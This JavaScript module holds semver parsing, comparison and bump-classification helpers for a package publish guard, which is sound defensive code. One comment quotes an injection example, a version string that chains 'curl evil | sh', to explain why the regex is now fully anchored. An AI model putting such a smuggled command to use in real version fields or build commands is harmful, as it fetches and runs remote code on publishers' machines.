/**
 * Pure version-bump classification used by `publish.mjs`. No I/O, no
 * `process.exit` - just semver math, so the publish guard applies
 * identical rules to every package.
 */

/**
 * Parse the leading `major.minor.patch` of a semver string. Returns
 * `null` for anything unparseable (a non-string, an empty string, a
 * `latest`-style dist-tag, a malformed manifest version). Callers treat
 * `null` as a hard error rather than coercing it to `0.0.0`, so a
 * garbage version can't masquerade as a fresh `graduation` and wave a
 * publish through.
 */
export function parseSemver(v) {
  if (typeof v !== 'string') return null;
  // Fully anchored: `major.minor.patch` with an optional semver
  // prerelease/build tail restricted to the semver identifier charset
  // ([0-9A-Za-z.-]). The previous pattern was start-anchored only, so a
  // version like `1.0.0 && curl evil | sh` still parsed as a valid bump and
  // its shell metacharacters survived into any string-interpolated command.
  const m = /^(\d+)\.(\d+)\.(\d+)(?:[-+][0-9A-Za-z.-]+)?$/.exec(v.trim());
  if (m === null) return null;
  return { major: Number(m[1]), minor: Number(m[2]), patch: Number(m[3]) };
}

/**
 * Compare two semver strings on `major.minor.patch`. Returns `-1` when
 * `a < b`, `0` when equal, `1` when `a > b`, or `null` when either side
 * is unparseable. Prerelease/build metadata is ignored (mirrors the
 * coarse comparison both publish scripts already used).
 */
export function compareSemver(a, b) {
  const pa = parseSemver(a);
  const pb = parseSemver(b);
  if (pa === null || pb === null) return null;
  for (const key of ['major', 'minor', 'patch']) {
    if (pa[key] !== pb[key]) return pa[key] < pb[key] ? -1 : 1;
  }
  return 0;
}

/**
 * Classify the jump from the `published` version to the `local`
 * version. One of:
 *
 *   'unknown'    - either version is unparseable (fail closed)
 *   'graduation' - 0.x → 1.0 (first stable release; warn, allow)
 *   'major'      - major + 1
 *   'major-skip' - major + 2 or more (likely a mistake; block)
 *   'minor'      - minor bump
 *   'patch'      - patch bump
 *   'no-op'      - identical (already published)
 *   'downgrade'  - local is older than published (block)
 */
export function classifyBump(published, local) {
  const prev = parseSemver(published);
  const next = parseSemver(local);
  if (prev === null || next === null) return 'unknown';
  if (next.major > prev.major) {
    if (prev.major === 0 && next.major === 1) return 'graduation';
    return next.major - prev.major === 1 ? 'major' : 'major-skip';
  }
  if (next.major < prev.major) return 'downgrade';
  if (next.minor > prev.minor) return 'minor';
  if (next.minor < prev.minor) return 'downgrade';
  if (next.patch > prev.patch) return 'patch';
  if (next.patch < prev.patch) return 'downgrade';
  return 'no-op';
}
